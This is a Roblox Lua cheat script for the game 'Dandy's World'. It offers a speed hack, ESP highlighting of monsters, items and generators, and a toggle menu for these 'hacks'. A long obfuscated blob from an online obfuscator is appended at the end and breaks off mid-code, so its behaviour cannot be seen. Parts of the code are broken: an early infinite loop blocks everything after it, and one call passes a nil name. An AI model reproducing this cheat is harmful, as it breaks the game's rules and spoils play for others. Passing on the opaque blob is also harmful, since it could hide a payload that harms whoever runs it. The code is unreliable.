
-- speed script:
_G.Speed = 50
while task.wait(0.02) do
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = _G.Speed
end

local UserInputService = game:GetService("UserInputService")

_G.speeds = {50, 100, 250}
local currentIndex = 1

_G.Speed = _G.speeds[currentIndex]

UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then return end
	
	if input.KeyCode == Enum.KeyCode.Z then
		currentIndex += 1
		
		if currentIndex > #_G.speeds then
			currentIndex = 1
		end
		
		_G.Speed = _G.speeds[currentIndex]
		print("Speed changed to:", _G.Speed)
	end
end)

-- other hacks:
local module = {}

function module:CreateNewTab(tabid)
	local TabScripts = {}
	local ScreenGui0 = Instance.new("ScreenGui")
	local Frame1 = Instance.new("Frame")
	local UICorner2 = Instance.new("UICorner")
	ScreenGui0.Parent = game.Players.LocalPlayer.PlayerGui
	ScreenGui0.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	ScreenGui0.ResetOnSpawn = false
	Frame1.Parent = ScreenGui0
	Frame1.Position = UDim2.new(0, 0, 0, 0)
	Frame1.Size = UDim2.new(0, 440, 0, 259)
	Frame1.BackgroundColor = BrickColor.new("Really black")
	Frame1.BackgroundColor3 = Color3.new(0.0705882, 0.0705882, 0.0705882)
	Frame1.BackgroundTransparency = 0.4000000059604645
	Frame1.BorderColor = BrickColor.new("Really black")
	Frame1.BorderColor3 = Color3.new(0, 0, 0)
	Frame1.BorderSizePixel = 0
	local UserInputService = game:GetService("UserInputService")

	local gui = Frame1
	local dragging
	local dragInput
	local dragStart
	local startPos

	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end

	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)

	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)

	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
	local TextButton0 = Instance.new("TextButton")
	local UICorner = Instance.new("UICorner")
	TextButton0.Name = "smaller"
	TextButton0.Parent = Frame1
	TextButton0.Position = UDim2.new(0.925000012, 0, 0, 0)
	TextButton0.Size = UDim2.new(0, 22, 0, 22)
	TextButton0.BackgroundColor = BrickColor.new("Dark grey")
	TextButton0.BackgroundColor3 = Color3.new(0.415686, 0.415686, 0.415686)
	TextButton0.BackgroundTransparency = 0.4000000059604645
	TextButton0.BorderColor = BrickColor.new("Really black")
	TextButton0.BorderColor3 = Color3.new(0, 0, 0)
	TextButton0.BorderSizePixel = 0
	TextButton0.Font = Enum.Font.Gotham
	TextButton0.FontSize = Enum.FontSize.Size14
	TextButton0.Text = "-"
	TextButton0.TextColor = BrickColor.new("Institutional white")
	TextButton0.TextColor3 = Color3.new(1, 1, 1)
	TextButton0.TextScaled = true
	TextButton0.TextSize = 14
	TextButton0.TextWrap = true
	TextButton0.TextWrapped = true
	UICorner.Parent = TextButton0
	TextButton0.MouseButton1Click:Connect(function()
		Frame1.Visible = false
	end)
	UICorner2.Parent = Frame1

	UserInputService.InputBegan:Connect(function(input, gameProcessed)
		if not gameProcessed and input.KeyCode == Enum.KeyCode.LeftControl then
			Frame1.Visible = not Frame1.Visible
		end
	end)
	local title = nil
	function TabScripts:NewTitle(name) 
		local TextLabel1 = Instance.new("TextLabel")
		TextLabel1.Name = "title"
		TextLabel1.Parent = Frame1
		TextLabel1.Position = UDim2.new(0.0227272734, 0, 0, 0)
		TextLabel1.Size = UDim2.new(0, 381, 0, 22)
		TextLabel1.BackgroundColor = BrickColor.new("Institutional white")
		TextLabel1.BackgroundColor3 = Color3.new(1, 1, 1)
		TextLabel1.BackgroundTransparency = 1
		TextLabel1.BorderColor = BrickColor.new("Really black")
		TextLabel1.BorderColor3 = Color3.new(0, 0, 0)
		TextLabel1.BorderSizePixel = 0
		TextLabel1.Font = Enum.Font.Gotham
		TextLabel1.FontSize = Enum.FontSize.Size14
		TextLabel1.Text = name
		TextLabel1.TextColor = BrickColor.new("Institutional white")
		TextLabel1.TextColor3 = Color3.new(1, 1, 1)
		TextLabel1.TextScaled = true
		TextLabel1.TextSize = 14
		TextLabel1.TextWrap = true
		TextLabel1.TextWrapped = true
		TextLabel1.TextXAlignment = Enum.TextXAlignment.Left
		title = TextLabel1
	end
	function TabScripts:ChangeTitleName(new)
		if title then
			title.Text = new
		else
			warn("\n:ChangeTitleName()\nWarning: Applies not applied.\n	|- Warning 1: title not found.\n	|_ Warning 2: Please install the title with :NewTitle(name)")
		end
	end
	local sections = {
		left = nil,
		right = nil
	}
	--[[
AddSections()
The Tool to make sections. For the tabs.
	]]
	function TabScripts:AddSections()
		local Frame0 = Instance.new("Frame")
		sections.right = Frame0
		local Frame1T = Instance.new("Frame")
		sections.left = Frame1T
		local UICorner1 = Instance.new("UICorner")
		local UICorner2 = Instance.new("UICorner")
		local UIListLayout = Instance.new("UIListLayout")
		UIListLayout.Parent = Frame1T
		UIListLayout.Padding = UDim.new(0, 5)
		Frame0.Name = "TAB2"
		Frame0.Parent = Frame1
		Frame0.Position = UDim2.new(0.300000012, 0, 0.0849420875, 0)
		Frame0.Size = UDim2.new(0, 297, 0, 224)
		Frame0.BackgroundColor = BrickColor.new("Dark grey metallic")
		Frame0.BackgroundColor3 = Color3.new(0.32549, 0.32549, 0.32549)
		Frame0.BackgroundTransparency = 0.4000000059604645
		Frame0.BorderColor = BrickColor.new("Really black")
		Frame0.BorderColor3 = Color3.new(0, 0, 0)
		Frame0.BorderSizePixel = 0
		Frame1T.Name = "TAB1"
		Frame1T.Parent = Frame1
		Frame1T.Position = UDim2.new(0.0227272734, 0, 0.0849420875, 0)
		Frame1T.Size = UDim2.new(0, 110, 0, 224)
		Frame1T.BackgroundColor = BrickColor.new("Dark grey metallic")
		Frame1T.BackgroundColor3 = Color3.new(0.32549, 0.32549, 0.32549)
		Frame1T.BackgroundTransparency = 0.4000000059604645
		Frame1T.BorderColor = BrickColor.new("Really black")
		Frame1T.BorderColor3 = Color3.new(0, 0, 0)
		Frame1T.BorderSizePixel = 0
		UICorner1.Parent = Frame0
		UICorner2.Parent = Frame1T
		print("Add Sections complete")
	end
	
	--[[
		AddTab(tabname: string, imageid: number, vis: boolean)	
		Adds a tab.
	]]
	local tabs = {}
	function TabScripts:AddTab(tabname: string, imageid: number, vis: boolean)
		if sections.left then
		local Frame0 = Instance.new("Frame")
		local TextLabel1 = Instance.new("TextLabel")
		local ImageLabel2 = Instance.new("ImageLabel")
		local TextButton3 = Instance.new("TextButton")
		local UICorner4 = Instance.new("UICorner")
		Frame0.Name = tabname
		Frame0.Parent = sections.left
		Frame0.Size = UDim2.new(0, 110, 0, 35)
		Frame0.BackgroundColor = BrickColor.new("Dark grey metallic")
		Frame0.BackgroundColor3 = Color3.new(0.352941, 0.352941, 0.352941)
		Frame0.BackgroundTransparency = 0.4000000059604645
		Frame0.BorderColor = BrickColor.new("Really black")
		Frame0.BorderColor3 = Color3.new(0, 0, 0)
		Frame0.BorderSizePixel = 0
		TextLabel1.Parent = Frame0
		TextLabel1.Position = UDim2.new(0.336363643, 0, 0.22857143, 0)
		TextLabel1.Size = UDim2.new(0, 73, 0, 18)
		TextLabel1.BackgroundColor = BrickColor.new("Institutional white")
		TextLabel1.BackgroundColor3 = Color3.new(1, 1, 1)
		TextLabel1.BackgroundTransparency = 1
		TextLabel1.BorderColor = BrickColor.new("Really black")
		TextLabel1.BorderColor3 = Color3.new(0, 0, 0)
		TextLabel1.BorderSizePixel = 0
		TextLabel1.Font = Enum.Font.Gotham
		TextLabel1.FontSize = Enum.FontSize.Size14
		TextLabel1.Text = tabname
		TextLabel1.TextColor = BrickColor.new("Institutional white")
		TextLabel1.TextColor3 = Color3.new(1, 1, 1)
		TextLabel1.TextSize = 14
		TextLabel1.TextXAlignment = Enum.TextXAlignment.Left
		ImageLabel2.Parent = Frame0
		ImageLabel2.Position = UDim2.new(0.0500000007, 0, 0.140000001, 0)
		ImageLabel2.Size = UDim2.new(0, 26, 0, 26)
		ImageLabel2.BackgroundColor = BrickColor.new("Institutional white")
		ImageLabel2.BackgroundColor3 = Color3.new(1, 1, 1)
		ImageLabel2.BackgroundTransparency = 1
		ImageLabel2.BorderColor = BrickColor.new("Really black")
		ImageLabel2.BorderColor3 = Color3.new(0, 0, 0)
		ImageLabel2.BorderSizePixel = 0
		if imageid ~= nil then ImageLabel2.Image = "rbxassetid://" .. imageid end
		TextButton3.Name = "Active"
		TextButton3.Parent = Frame0
		TextButton3.Size = UDim2.new(1, 0, 1, 0)
		TextButton3.BackgroundColor = BrickColor.new("Institutional white")
		TextButton3.BackgroundColor3 = Color3.new(1, 1, 1)
		TextButton3.BackgroundTransparency = 1
		TextButton3.BorderColor = BrickColor.new("Really black")
		TextButton3.BorderColor3 = Color3.new(0, 0, 0)
		TextButton3.BorderSizePixel = 0
		TextButton3.Font = Enum.Font.SourceSans
		TextButton3.FontSize = Enum.FontSize.Size14
		TextButton3.Text = ""
		TextButton3.TextColor = BrickColor.new("Really black")
		TextButton3.TextColor3 = Color3.new(0, 0, 0)
		TextButton3.TextSize = 14
		UICorner4.Parent = Frame0
			local ScrollingFrame0 = Instance.new("ScrollingFrame")
			local UIListLayout1 = Instance.new("UIListLayout")
			
			ScrollingFrame0.Name = "Tab"
			ScrollingFrame0.Parent = sections.right
			ScrollingFrame0.Size = UDim2.new(1, 0, 1, 0)
			ScrollingFrame0.Active = true
			ScrollingFrame0.BackgroundColor = BrickColor.new("Institutional white")
			ScrollingFrame0.BackgroundColor3 = Color3.new(1, 1, 1)
			ScrollingFrame0.BackgroundTransparency = 1
			ScrollingFrame0.BorderColor = BrickColor.new("Really black")
			ScrollingFrame0.BorderColor3 = Color3.new(0, 0, 0)
			ScrollingFrame0.BorderSizePixel = 0
			ScrollingFrame0.CanvasSize = UDim2.new(0, 0, 0, 0)
			ScrollingFrame0.Visible = vis
			tabs[tabname] = {
				ScrollingFrame = ScrollingFrame0,
				Button = Frame0,
				UIListLayout = UIListLayout1
			}
			UIListLayout1.Parent = ScrollingFrame0
			UIListLayout1.SortOrder = Enum.SortOrder.LayoutOrder
			UIListLayout1.Padding = UDim.new(0, 10)
			TextButton3.MouseButton1Click:Connect(function()
				for i, v in pairs(tabs) do
					v.ScrollingFrame.Visible = false
				end
				tabs[tabname].ScrollingFrame.Visible = true
			end)
		else
			warn("Use addsections() first!")
		end
	end
	--[[
		AddNewHackToList
	]]
	function TabScripts:AddNewHackToList(tabname: string, id: string, properties: {}, name: string, desc: string)
		if not tabs[tabname] then warn("Tab "..tabname.." not found."); return end
		if not properties.OnEnabled then warn("properties.OnEnabled() isnt made!"); return end
		if not properties.OnDisabled then warn("properties.OnDisabled() isnt made!"); return end
		local Frame0 = Instance.new("Frame")
		local TextLabel1 = Instance.new("TextLabel")
		local Frame2 = Instance.new("Frame")
		local Frame3 = Instance.new("Frame")
		local TextButton4 = Instance.new("TextButton")
		local TextLabel5 = Instance.new("TextLabel")
		local UICorner6 = Instance.new("UICorner")
		local UICorner7 = Instance.new("UICorner")
		local UICorner8 = Instance.new("UICorner")
		Frame0.Name = "Hack"
		Frame0.Parent = tabs[tabname].ScrollingFrame
		Frame0.Size = UDim2.new(0, 297, 0, 60)
		Frame0.BackgroundColor = BrickColor.new("Dark grey metallic")
		Frame0.BackgroundColor3 = Color3.new(0.34902, 0.34902, 0.34902)
		Frame0.BackgroundTransparency = 0.4000000059604645
		Frame0.BorderColor = BrickColor.new("Really black")
		Frame0.BorderColor3 = Color3.new(0, 0, 0)
		Frame0.BorderSizePixel = 0
		TextLabel1.Name = "text"
		TextLabel1.Parent = Frame0
		TextLabel1.Position = UDim2.new(0.0235690232, 0, 0, 0)
		TextLabel1.Size = UDim2.new(0, 217, 0, 26)
		TextLabel1.BackgroundColor = BrickColor.new("Institutional white")
		TextLabel1.BackgroundColor3 = Color3.new(1, 1, 1)
		TextLabel1.BackgroundTransparency = 1
		TextLabel1.BorderColor = BrickColor.new("Really black")
		TextLabel1.BorderColor3 = Color3.new(0, 0, 0)
		TextLabel1.BorderSizePixel = 0
		TextLabel1.Font = Enum.Font.Gotham
		TextLabel1.FontSize = Enum.FontSize.Size14
		TextLabel1.Text = name or "Top Text"
		TextLabel1.TextColor = BrickColor.new("Institutional white")
		TextLabel1.TextColor3 = Color3.new(1, 1, 1)
		TextLabel1.TextScaled = true
		TextLabel1.TextSize = 14
		TextLabel1.TextWrap = true
		TextLabel1.TextWrapped = true
		TextLabel1.TextXAlignment = Enum.TextXAlignment.Left
		Frame2.Parent = Frame0
		Frame2.Position = UDim2.new(0.791245818, 0, 0.266666681, 0)
		Frame2.Size = UDim2.new(0, 53, 0, 27)
		Frame2.BackgroundColor = BrickColor.new("Medium brown")
		Frame2.BackgroundColor3 = Color3.new(0.258824, 0.258824, 0.258824)
		Frame2.BorderColor = BrickColor.new("Really black")
		Frame2.BorderColor3 = Color3.new(0, 0, 0)
		Frame2.BorderSizePixel = 0
		Frame3.Parent = Frame2
		Frame3.Position = UDim2.new(0.452830195, 0, 0, 0)
		Frame3.Size = UDim2.new(0, 29, 0, 27)
		Frame3.BackgroundColor = BrickColor.new("Sand green")
		Frame3.BackgroundColor3 = Color3.new(0.486275, 0.486275, 0.486275)
		Frame3.BorderColor = BrickColor.new("Really black")
		Frame3.BorderColor3 = Color3.new(0, 0, 0)
		Frame3.BorderSizePixel = 0
		TextButton4.Name = "Toggle"
		TextButton4.Parent = Frame2
		TextButton4.Size = UDim2.new(1, 0, 1, 0)
		TextButton4.BackgroundColor = BrickColor.new("Institutional white")
		TextButton4.BackgroundColor3 = Color3.new(1, 1, 1)
		TextButton4.BackgroundTransparency = 1
		TextButton4.BorderColor = BrickColor.new("Really black")
		TextButton4.BorderColor3 = Color3.new(0, 0, 0)
		TextButton4.BorderSizePixel = 0
		TextButton4.Font = Enum.Font.SourceSans
		TextButton4.FontSize = Enum.FontSize.Size14
		TextButton4.Text = ""
		TextButton4.TextColor = BrickColor.new("Really black")
		TextButton4.TextColor3 = Color3.new(0, 0, 0)
		TextButton4.TextSize = 14
		TextLabel5.Name = "desc"
		TextLabel5.Parent = Frame0
		TextLabel5.Position = UDim2.new(0.0235690232, 0, 0.433333337, 0)
		TextLabel5.Size = UDim2.new(0, 217, 0, 28)
		TextLabel5.BackgroundColor = BrickColor.new("Institutional white")
		TextLabel5.BackgroundColor3 = Color3.new(1, 1, 1)
		TextLabel5.BackgroundTransparency = 1
		TextLabel5.BorderColor = BrickColor.new("Really black")
		TextLabel5.BorderColor3 = Color3.new(0, 0, 0)
		TextLabel5.BorderSizePixel = 0
		TextLabel5.Font = Enum.Font.Gotham
		TextLabel5.FontSize = Enum.FontSize.Size14
		TextLabel5.Text = desc or "Youll see this desc if you didnt set one."
		TextLabel5.TextColor = BrickColor.new("Institutional white")
		TextLabel5.TextColor3 = Color3.new(1, 1, 1)
		TextLabel5.TextScaled = true
		TextLabel5.TextSize = 14
		TextLabel5.TextWrap = true
		TextLabel5.TextWrapped = true
		TextLabel5.TextXAlignment = Enum.TextXAlignment.Left
		UICorner6.Parent = Frame0
		UICorner7.Parent = Frame2
		UICorner7.CornerRadius = UDim.new(0, 25)
		UICorner8.Parent = Frame3
		UICorner8.CornerRadius = UDim.new(0, 25)
		local enabled = false
		Frame3.Position = UDim2.new(0, 0, 0, 0)
		
		TextButton4.MouseButton1Click:Connect(function()
			enabled = not enabled
			if enabled then
				Frame3.Position = UDim2.new(0.452830195, 0, 0, 0)
				properties.OnEnabled()
			else
				Frame3.Position = UDim2.new(0, 0, 0, 0)
				properties.OnDisabled()
			end
		end)
		tabs[tabname].ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, tabs[tabname].UIListLayout.AbsoluteContentSize.Y)
	end
	return TabScripts
end



local test = module
local a = test:CreateNewTab("a")

a:NewTitle("Dandy's World Hack (V 1.0.1)")
a:AddSections()
a:AddTab("ESP", 90234209088161, true)
local RunService = game:GetService("RunService")

local esp = {
	items = false,
	monsters = false,
	generators = false,
	connection = nil
}

local function clearHighlights(folder)
	for _, obj in pairs(folder:GetDescendants()) do
		local h = obj:FindFirstChild("Highlight")
		if h then
			h:Destroy()
		end
	end
end

local function startESP()

	if esp.connection then return end

	esp.connection = RunService.Heartbeat:Connect(function()

		local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
		if not currentRoom then return end

		for _, room in pairs(currentRoom:GetChildren()) do

			-- ITEMS
			if esp.items then
				local items = room:FindFirstChild("Items")
				if items then
					for _, item in pairs(items:GetChildren()) do
						if not item:FindFirstChild("Highlight") then
							local h = Instance.new("Highlight")
							h.FillColor = Color3.fromRGB(255,208,0)
							h.FillTransparency = 0.5
							h.OutlineTransparency = 1
							h.Parent = item
						end
					end
				end
			end

			-- MONSTERS
			if esp.monsters then
				local monsters = room:FindFirstChild("Monsters")
				if monsters then
					for _, monster in pairs(monsters:GetChildren()) do
						if not monster:FindFirstChild("Highlight") then
							local h = Instance.new("Highlight")
							h.FillColor = Color3.fromRGB(255,0,0)
							h.FillTransparency = 0.5
							h.OutlineTransparency = 1
							h.Parent = monster
						end
					end
				end
			end

			-- GENERATORS
			if esp.generators then
				local generators = room:FindFirstChild("Generators")
				if generators then
					for _, generator in pairs(generators:GetChildren()) do

						if generator.Stats.Completed.Value then
							local h = generator:FindFirstChild("Highlight")
							if h then
								h:Destroy()
							end
						else
							if not generator:FindFirstChild("Highlight") then
								local h = Instance.new("Highlight")
								h.FillColor = Color3.fromRGB(0,0,255)
								h.FillTransparency = 0.5
								h.OutlineTransparency = 1
								h.Parent = generator
							end
						end

					end
				end
			end

		end
	end)
end

local function stopESP()
	if esp.connection then
		esp.connection:Disconnect()
		esp.connection = nil
	end

	local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
	if currentRoom then
		clearHighlights(currentRoom)
	end
end
startESP()
a:AddNewHackToList("ESP", "esp-items", {
	OnEnabled = function()
		esp.items = true
	end,
	OnDisabled = function()
		esp.items = false
		stopESP()
		startESP()
	end,
}, "ESP Items", "Enables ESP for items.")

a:AddNewHackToList("ESP", "esp-monsters", {
	OnEnabled = function()
		esp.monsters = true
	end,
	OnDisabled = function()
		esp.monsters = false
		stopESP()
		startESP()
	end,
}, "ESP Items", "Enables ESP for monsters.")

a:AddNewHackToList("ESP", "esp-generators", {
	OnEnabled = function()
		esp.generators = true
	end,
	OnDisabled = function()
		esp.generators = false
		stopESP()
		startESP()
	end,
}, "ESP Items", "Enables ESP for generators.")


a:AddTab("Speed", 90234209088161, false)
local characterSpeeds = {
	pebble = {
		speed = 30,
		call = "Pebble"
	},
	razzledazzle_odd = {
		speed = 30,
		call = "Razzle & Dazzle (on odd numbered floors)"
	},
	looey_1hp = {
		speed = 30,
		call = "Looey (when at one heart)"
	},
	bobette = {
		speed = 27.5,
		call = "Bobette"
	},
	flutter = {
		speed = 27.5,
		call = "Flutter"
	},
	goob = {
		speed = 27.5,
		call = "Goob"
	},
	tisha = {
		speed = 27.5,
		call = "Tisha"
	},
	coal = {
		speed = 27.5,
		call = "Coal"
	},
	boxten = {
		speed = 25,
		call = "Boxten"
	},
	poppy = {
		speed = 25,
		call = "Poppy"
	},
	finn = {
		speed = 25,
		call = "Finn"
	},
	shelly = {
		speed = 25,
		call = "Shelly"
	},
	sprout = {
		speed = 25,
		call = "Sprout"
	},
	teagan = {
		speed = 25,
		call = "Teagan"
	},
	astro = {
		speed = 25,
		call = "Astro"
	},
	rodger = {
		speed = 25,
		call = "Rodger"
	},
	glisten = {
		speed = 25,
		call = "Glisten"
	},
	gigi = {
		speed = 25,
		call = "Gigi"
	},
	scraps = {
		speed = 25,
		call = "Scraps"
	},
	vee = {
		speed = 25,
		call = "Vee"
	},
	rudie = {
		speed = 25,
		call = "Rudie"
	},
	ginger = {
		speed = 25,
		call = "Ginger"
	},
	brightney = {
		speed = 22.5,
		call = "Brightney"
	},
	cosmo = {
		speed = 22.5,
		call = "Cosmo"
	},
	connie = {
		speed = 22.5,
		call = "Connie"
	},
	toodles = {
		speed = 22.5,
		call = "Toodles"
	},
	shrimpo = {
		speed = 20,
		call = "Shrimpo"
	},
	razzledazzle_even = {
		speed = 20,
		call = "Razzle & Dazzle (on even numbered floors)"
	},
	pebblechasespeed = {
		speed = 35,
		call = "Pebble [Twisted] (for distracting)"
	}
}

for i, item in pairs(characterSpeeds) do
	local enabled = false
	local oldspeed = nil
	a:AddNewHackToList("Speed", characterSpeeds.call, {
		OnEnabled = function()
			oldspeed = game.Players.LocalPlayer.Character.Humanoid.WalkSpeed
			enabled = true
			while task.wait(0.02) do
				if enabled then
					game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = item.speed
				else
					break
				end
			end
		end,
		OnDisabled = function()
			enabled = false
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = oldspeed
		end,
	}, item.call .. " Speed", "Speed: "..item.speed)
end
--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v80=0;local v81;while true do if (v80==0) then v81=v2(v0(v30,16));if v19 then local v99=v5(v81,v19);v19=nil;return v99;else return v81;end break;end end end end);local function v20(v31,v32,v33) if v33 then local v82=(v31/((5 -3)^(v32-((2 -0) -1))))%((570 -(367 + 201))^(((v33-((1993 -(68 + 997)) -(214 + 713))) -(v32-(1 -0))) + 1)) ;return v82-(v82%((1271 -(226 + 1044)) + (0 -0))) ;else local v83=(879 -((399 -(32 + 85)) + 595))^(v32-(2 -(1 + 0))) ;return (((v31%(v83 + v83))>=v83) and (620 -(555 + 64))) or (931 -(857 + 74)) ;end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35,v36=v1(v16,v18,v18 + 1 + 1 );v18=v18 + (959 -(892 + 65)) ;return (v36 * (610 -354)) + v35 ;end local function v23() local v37,v38,v39,v40=v1(v16,v18,v18 + (5 -2) );v18=v18 + 4 ;return (v40 * (30800116 -14022900)) + (v39 * (65886 -(87 + 263))) + (v38 * 256) + v37 ;end local function v24() local v41=v23();local v42=v23();local v43=181 -(67 + 113) ;local v44=(v20(v42,1 + 0 ,49 -29 ) * ((2 + 0)^((225 -98) -95))) + v41 ;local v45=v20(v42,21,31);local v46=((v20(v42,(977 + 7) -(802 + 150) )==1) and  -(2 -1)) or 1 ;if (v45==(0 -0)) then if (v44==0) then return v46 * (0 + 0) ;else v45=998 -(915 + (873 -(368 + 423))) ;v43=0 -0 ;end elseif (v45==(5796 -(3767 -(10 + 8)))) then return ((v44==(0 + 0)) and (v46 * ((1 -0)/(1187 -((4111 -3042) + 118))))) or (v46 * NaN) ;end return v8(v46,v45-(2320 -1297) ) * (v43 + (v44/((3 -1)^((452 -(416 + 26)) + 42)))) ;end local function v25(v47) local v48;if  not v47 then v47=v23();if (v47==0) then return "";end end v48=v3(v16,v18,(v18 + v47) -(3 -2) );v18=v18 + v47 ;local v49={};for v64=1 + 0 , #v48 do v49[v64]=v2(v1(v3(v48,v64,v64)));end return v6(v49);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v50=(function() return 0;end)();local v51=(function() return;end)();local v52=(function() return;end)();local v53=(function() return;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();while true do if (v50==3) then for v91= #"!",v23() do local v92=(function() return 0;end)();local v93=(function() return;end)();while true do if (v92~=0) then else v93=(function() return v21();end)();if (v20(v93, #":", #"!")~=(1045 -(49 + 996))) then else local v130=(function() return 0;end)();local v131=(function() return;end)();local v132=(function() return;end)();local v133=(function() return;end)();while true do if (v130==3) then if (v20(v132, #"xnx", #"asd")== #"}") then v133[ #"0836"]=(function() return v57[v133[ #"asd1"]];end)();end v52[v91]=(function() return v133;end)();break;end if (v130==(1 + 0)) then local v158=(function() return 1474 -(1329 + 145) ;end)();while true do if (v158==0) then v133=(function() return {v22(),v22(),nil,nil};end)();if (v131==(971 -(140 + 831))) then local v165=(function() return 1850 -(1409 + 441) ;end)();while true do if (v165==0) then v133[ #"gha"]=(function() return v22();end)();v133[ #".com"]=(function() return v22();end)();break;end end elseif (v131== #" ") then v133[ #"asd"]=(function() return v23();end)();elseif (v131==(720 -(15 + 703))) then v133[ #"asd"]=(function() return v23() -(2^16) ;end)();elseif (v131== #"xnx") then local v171=(function() return 0 + 0 ;end)();local v172=(function() return;end)();while true do if (v171~=(438 -(262 + 176))) then else v172=(function() return 1721 -(345 + 1376) ;end)();while true do if (v172~=0) then else v133[ #"nil"]=(function() return v23() -((690 -(198 + 490))^16) ;end)();v133[ #"asd1"]=(function() return v22();end)();break;end end break;end end end v158=(function() return 4 -3 ;end)();end if (v158==1) then v130=(function() return 2;end)();break;end end end if ((0 -0)==v130) then v131=(function() return v20(v93,2, #"91(");end)();v132=(function() return v20(v93, #"asd1",6);end)();v130=(function() return 1207 -(696 + 510) ;end)();end if ((3 -1)~=v130) then else if (v20(v132, #"}", #">")~= #"]") then else v133[1264 -(1091 + 171) ]=(function() return v57[v133[1 + 1 ]];end)();end if (v20(v132,6 -4 ,2)== #"\\") then v133[ #"xxx"]=(function() return v57[v133[ #"91("]];end)();end v130=(function() return 3;end)();end end end break;end end end for v94= #"~",v23() do v53,v94,v28=(function() return v51(v53,v94,v28);end)();end return v55;end if (v50==0) then local v87=(function() return 0;end)();local v88=(function() return;end)();while true do if ((0 -0)==v87) then v88=(function() return 374 -(123 + 251) ;end)();while true do if (0~=v88) then else v51=(function() return function(v147,v148,v149) local v150=(function() return 0;end)();local v151=(function() return;end)();while true do if (0~=v150) then else v151=(function() return 0 -0 ;end)();while true do if (v151~=0) then else v147[v148-#"{" ]=(function() return v149();end)();return v147,v148,v149;end end break;end end end;end)();v52=(function() return {};end)();v88=(function() return 1;end)();end if (v88==(699 -(208 + 490))) then v53=(function() return {};end)();v50=(function() return 1;end)();break;end end break;end end end if (v50==(1 + 0)) then v54=(function() return {};end)();v55=(function() return {v52,v53,nil,v54};end)();v56=(function() return v23();end)();v50=(function() return 1 + 1 ;end)();end if (v50~=(838 -(660 + 176))) then else local v89=(function() return 0;end)();local v90=(function() return;end)();while true do if (v89==0) then v90=(function() return 0 + 0 ;end)();while true do if (v90==(202 -(14 + 188))) then v57=(function() return {};end)();for v137= #"!",v56 do local v138=(function() return 675 -(534 + 141) ;end)();local v139=(function() return;end)();local v140=(function() return;end)();local v141=(function() return;end)();while true do if (v138~=(1 + 0)) then else v141=(function() return nil;end)();while true do if (v139==0) then v140=(function() return v21();end)();v141=(function() return nil;end)();v139=(function() return 1 + 0 ;end)();end if (v139==(1 + 0)) then if (v140== #"!") then v141=(function() return v21()~=(0 -0) ;end)();elseif (v140==2) then v141=(function() return v24();end)();elseif (v140== #"asd") then v141=(function() return v25();end)();end v57[v137]=(function() return v141;end)();break;end end break;end if (0==v138) then v139=(function() return 0 -0 ;end)();v140=(function() return nil;end)();v138=(function() return 2 -1 ;end)();end end end v90=(function() return 1 + 0 ;end)();end if (v90~=(1 + 0)) then else v55[ #"gha"]=(function() return v21();end)();v50=(function() return 3;end)();break;end end break;end end end end end local function v29(v58,v59,v60) local v61=v58[1];local v62=v58[2];local v63=v58[399 -(115 + (1062 -781)) ];return function(...) local v66=v61;local v67=v62;local v68=v63;local v69=v27;local v70=291 -(60 + 230) ;local v71= -(2 -1);local v72={};local v73={...};local v74=v12("#",...) -(1 + (1212 -(323 + 889))) ;local v75={};local v76={};for v84=0,v74 do if ((v84>=v68) or (2874<2181)) then v72[v84-v68 ]=v73[v84 + (2 -1) ];else v76[v84]=v73[v84 + ((7 -4) -(128 -(116 + 10))) ];end end local v77=(v74-v68) + (2 -(1 + 0)) ;local v78;local v79;while true do v78=v66[v70];v79=v78[868 -(550 + 317) ];if (v79<=((741 -(542 + 196)) -0)) then if ((v79<=1) or (2689<=343)) then if (v79>(1251 -(721 + 530))) then v76[v78[2 -0 ]]=v78[(588 -(361 + 219)) -5 ];else v76[v78[287 -(134 + (471 -(53 + 267))) ]]=v60[v78[1668 -(284 + 686 + 695) ]];end elseif (v79>((2 + 1) -1)) then do return;end else local v104=v78[1992 -(582 + 1408) ];local v105=v76[v78[1089 -(461 + 625) ]];v76[v104 + (1289 -(993 + 107 + 188)) ]=v105;v76[v104]=v105[v78[1 + 3 ]];end elseif (v79<=(17 -(3 + 9))) then if (v79>(4 -0)) then local v109;local v110,v111;local v112;local 